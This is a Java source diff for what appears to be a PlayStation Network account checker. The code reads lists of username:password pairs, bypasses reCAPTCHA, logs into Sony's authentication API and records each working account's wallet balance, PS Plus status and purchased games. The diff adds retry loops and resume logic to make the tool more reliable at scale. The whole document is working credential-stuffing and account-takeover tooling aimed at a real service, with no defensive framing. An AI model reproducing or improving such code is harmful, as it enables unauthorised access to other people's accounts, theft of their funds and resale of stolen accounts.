@@ -1,6 +1,7 @@
 package com.checker;
 
 import java.net.MalformedURLException;
+import java.net.URISyntaxException;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -36,40 +37,41 @@ public class Main {
 
 	static PrintWriter pw;
 	
-    public static void main(String[] args) throws InterruptedException, JSONException, IOException {
-        // String recaptchaToken = deathByCaptcha();
-    	String recaptchaToken = resolveRecaptcha();
+    public static void main(String[] args) throws InterruptedException, JSONException, IOException, URISyntaxException {
     	List<Account> accounts = readAccountsFromFile();
-    	executeWorker(accounts, recaptchaToken);
-        
+    	executeWorker(accounts);
     }
     
-    private static void executeWorker(List<Account> accounts, String recaptchaToken) throws IOException {
+    private static void executeWorker(List<Account> accounts) throws IOException, URISyntaxException, InterruptedException {
     	int i=0;
     	String currentLine;
-    	String outputFileName = "/Users/bentaalaomar/Desktop/driver/output.txt";
+    	BufferedReader outBr;
         List<Account> validAccounts = new ArrayList<Account>();
     	final List<Account> accountsProgress = new ArrayList<Account>();
     	try {
-    		URL resource = Main.class.getResource("output.txt");
-    		BufferedReader outBr = new BufferedReader(new FileReader(new File(resource.getFile())));
-			
-	    	while ((currentLine = outBr.readLine()) != null) {
-	    		if(currentLine.contains("<------")) {
-	    			currentLine = currentLine.replace("<------  ", "");
-	    			currentLine = currentLine.substring(0, currentLine.indexOf('(') - 1).trim();
-	    			String[] credentialsStr = currentLine.split(":");
-	    			if(credentialsStr.length == 2) {
-		    			Account pAccount = new Account(credentialsStr[0], credentialsStr[1]);
-		    			accountsProgress.add(pAccount);
-	    			}
-	    		}
-	    	}
-	    	outBr.close();
-    	}catch(FileNotFoundException fnfEx) {} catch (IOException e) {
-			// TODO Auto-generated catch block
+    		ClassLoader loader = Thread.currentThread().getContextClassLoader();
+			URL resource = loader.getResource("output.txt");
+			if(resource != null) {
+				outBr = new BufferedReader(new FileReader(new File(resource.toURI()).getAbsolutePath()));
+				while ((currentLine = outBr.readLine()) != null) {
+		    		if(currentLine.contains("<--------------")) {
+		    			currentLine = currentLine.replace("<-------------- ", "");
+		    			currentLine = currentLine.substring(0, currentLine.indexOf("<<<<") - 1).trim();
+		    			String[] credentialsStr = currentLine.split(":");
+		    			if(credentialsStr.length == 2) {
+			    			Account pAccount = new Account(credentialsStr[0], credentialsStr[1]);
+			    			accountsProgress.add(pAccount);
+		    			}
+		    		}
+		    	}
+			    outBr.close();
+			}
+		} catch (URISyntaxException e) {
+			e.printStackTrace();
+		} catch (IOException e) {
 			e.printStackTrace();
 		}
+
     	
     	validAccounts = accounts.stream().filter(new Predicate<Account>() {
 			public boolean test(Account acc) {
@@ -77,59 +79,82 @@ public class Main {
 			}
 		}).collect(Collectors.<Account>toList());
     	    	
+    	ClassLoader loaderPw = Thread.currentThread().getContextClassLoader();
+		URL resourcePw = loaderPw.getResource("output.txt");
+    	
         for(Account acc : validAccounts) {
+        	System.out.println("status (" + i + "," + validAccounts.size() + ") checked" );
+        	
         	pw = new PrintWriter(
-                    new FileWriter(outputFileName, true));
-        	
-        	System.out.println("status (" + i + "," + validAccounts.size() + ") checked"  ) ;
-        	
+                    new FileWriter(new File(resourcePw.toURI()), true));
+
         	String username = acc.getUsername();
             String password = acc.getPassword();
             
-            Object[] result = authenticate(recaptchaToken, username);
-            String token = (String) result[0];
-            Map<String, String> cookies = (Map<String, String>) result[1];
-            if (token != null) {
-            	cookies = getSsoCookie(token, username, password, cookies);
-                result = authorize(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D9281f207-82e0-4d11-8d42-f1c66a7959a3");
-                token = (String) result[0];
-                cookies = (Map<String, String>) result[1];
-                String languageStr = getLanguage(token, cookies);
-            	String[] tokens = languageStr.split("-");
-            	String language = tokens[0];
-            	String country = tokens[1];
-            	String balance = getBalance(token, cookies);
-            	
-            	Object[] codeAuthResult = authorizeWithCode(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=code&prompt=none&client_id=f6c7057b-f688-4744-91c0-8179592371d2&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D06b9d0fa-8fa6-4031-81ba-9d522d160844");
-            	cookies = (Map<String, String>) codeAuthResult[0];
-            	String authorizationCode = (String) codeAuthResult[1];
-            	cookies = getSesstionCookies(authorizationCode, token, cookies);
-            	boolean isPsPlus = isPsPlusMember(token, cookies);
-            	boolean isPs4Activated = isPs4SystemActivated(token, cookies);
-
-            	pw.println("<-------------- " 
-            			+ username + ":" + password + "(lang_reg: " + languageStr + ", balance: " + balance + ", ps_plus: " + isPsPlus + ", ps4_Activated:" + isPs4Activated + ")" 
-            			+ "------------------>");
-            	
-                 getPurchasedGames(cookies,language,country);
-            	
+            boolean retry = true;
+            while(retry) {
+                String token = "";
+            	String recaptchaToken = resolveRecaptcha();
+	            Object[] result = authenticate(recaptchaToken, username);
+	            if (result != null) {
+		            token = (String) result[0];
+		            Map<String, String> cookies = (Map<String, String>) result[1];
+	            	cookies = getSsoCookie(token, username, password, cookies);
+	                result = authorize(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D9281f207-82e0-4d11-8d42-f1c66a7959a3");
+	                if(result != null) {
+		                token = (String) result[0];
+		                cookies = (Map<String, String>) result[1];
+		                String languageStr = getLanguage(token, cookies);
+		            	String[] tokens = languageStr.split("-");
+		            	String language = tokens[0];
+		            	String country = tokens[1];
+		            	String balance = getBalance(token, cookies);
+		            	
+		            	Object[] codeAuthResult = authorizeWithCode(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=code&prompt=none&client_id=f6c7057b-f688-4744-91c0-8179592371d2&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D06b9d0fa-8fa6-4031-81ba-9d522d160844");
+		            	cookies = (Map<String, String>) codeAuthResult[0];
+		            	String authorizationCode = (String) codeAuthResult[1];
+		            	cookies = getSesstionCookies(authorizationCode, token, cookies);
+		            	boolean isPsPlus = isPsPlusMember(token, cookies);
+		            	boolean isPs4Activated = isPs4SystemActivated(token, cookies);
+		            	String psPlusStr = isPsPlus ? "pssPlus" : "notPsPlus";
+		            	String ps4ActivatedStr = isPs4Activated ? "Ps4_activated" : "Ps4_not_activated";
+		            	
+		            	pw.println("<-------------- " 
+		            			+ username + ":" + password + "(" + languageStr + "," + balance + "," +
+		            					psPlusStr + "," + ps4ActivatedStr + ")" 
+		            			+ "------------------>");
+		            	
+		                 getPurchasedGames(cookies,language,country);
+	                }
+	                else {
+	                	pw.println("<-------------- " + username + ":" + password + " <<<< ERROR >>>>)" 
+		            			+ "------------------>");
+	                }
+	                retry = false;
+	            }
+	            else {
+	            	retry = true;
+	            }
             }
             pw.close();
+            i++;
         }
     }
     
-	private static List<Account> readAccountsFromFile() {
+	private static List<Account> readAccountsFromFile() throws URISyntaxException {
 	    List<Account> accounts = new ArrayList<Account>();
 	    
 		BufferedReader br;
 		try {
-			URL resource = Main.class.getResource("input.txt");
-			br = new BufferedReader(new FileReader(new File(resource.getFile())));
+			ClassLoader loader = Thread.currentThread().getContextClassLoader();
+			URL resource = loader.getResource("input.txt");
+			br = new BufferedReader(new FileReader(new File(resource.toURI()).getAbsolutePath()));
 			
 			String currentLine;
 	        List<Account> checkedAccounts = new ArrayList<Account>();
+			Account account = null;
 			while ((currentLine = br.readLine()) != null) {
-				Account account = extractListFromInput(currentLine);
+				account = extractListFromInput(currentLine, account);
 				if(account != null && account.getUsername().compareTo("") != 0 && account.getPassword().compareTo("") != 0) {
 					if(!IsDoublon(account, checkedAccounts)) {
 						accounts.add(new Account(account.getUsername(), account.getPassword()));
@@ -139,6 +164,8 @@ public class Main {
 				}
 			}
 			br.close();
+			return checkedAccounts;
+			
 		} catch (FileNotFoundException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -151,8 +178,7 @@ public class Main {
 	}
 	
 	@SuppressWarnings("unused")
-	private static Account extractListFromInput(String currentLine) {
-		Account account = null;
+	private static Account extractListFromInput(String currentLine, Account account) {
 		if(currentLine.contains("j_username=")) {
 		    account = new Account();
 			currentLine = currentLine.replaceFirst("j_username=", "");
@@ -288,7 +314,7 @@ public class Main {
 		  String accountId = coreInfosWrapper.getString("accountId");
 		
 		  HttpRequest request = new HttpRequest(
-	          "https://wallets.api.playstation.com/api/transactions/summaries?ownerAccountId=" + accountId + "&limit=500&startDate=2016-02-16T00%3A00%3A00.000%2B0100&endDate=2019-02-16T23%3A59%3A59.999%2B0100&includePurged=false&transactionTypes=PRODUCT_PURCHASE");
+	          "https://wallets.api.playstation.com/api/transactions/summaries?ownerAccountId=" + accountId + "&limit=500&startDate=2015-02-16T00%3A00%3A00.000%2B0100&endDate=2020-02-16T23%3A59%3A59.999%2B0100&includePurged=false&transactionTypes=PRODUCT_PURCHASE");
 
 	      request.addHeader("Authorization", "Bearer " + authorizationToken);
 	      request.setCookies(cookies); 
@@ -321,8 +347,8 @@ public class Main {
 	        			isPSNReduced = orderItemDiscounts.length() > 0;
 	        		}catch(JSONException e) {}
 	        		if(totalPrice > 0 || isPSNReduced) {
-                    	productName = isAGameProduct(order.getString("skuId"), language, country);
-                    	if(!checkedProductNames.contains(productName)) {
+                    	productName = isAGameProduct(order.getString("skuId"), language, country) ;
+                    	if(!checkedProductNames.contains(productName) && productName != null) {
             	            pw.println(productName);
                 			checkedProductNames.add(productName);
                 		}
@@ -401,12 +427,15 @@ public class Main {
             String locationRedirect = response.getHeaders().get("Location");
             int startIndex = locationRedirect.indexOf("#");
             int endIndex = locationRedirect.indexOf("&", startIndex);
-            String authorizationTokenStr = locationRedirect.substring(startIndex, endIndex);
-            String[] authorizationTokenList = authorizationTokenStr.split("=");
-            Object[] result = new Object[2];
-            result[0] = authorizationTokenList[1];
-            result[1] = response.getCookies();
-            return result;
+            if(startIndex != -1) {
+	            String authorizationTokenStr = locationRedirect.substring(startIndex, endIndex);
+	            String[] authorizationTokenList = authorizationTokenStr.split("=");
+	            Object[] result = new Object[2];
+	            result[0] = authorizationTokenList[1];
+	            result[1] = response.getCookies();
+	            return result;
+            }
+            return null;
         } catch (Exception e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
@@ -584,8 +613,7 @@ public class Main {
     			return gameTitle;
 	            
          }
-      } catch (Exception e) {
-      }
+      } catch (Exception e) {}
 	return null;
   	
   }
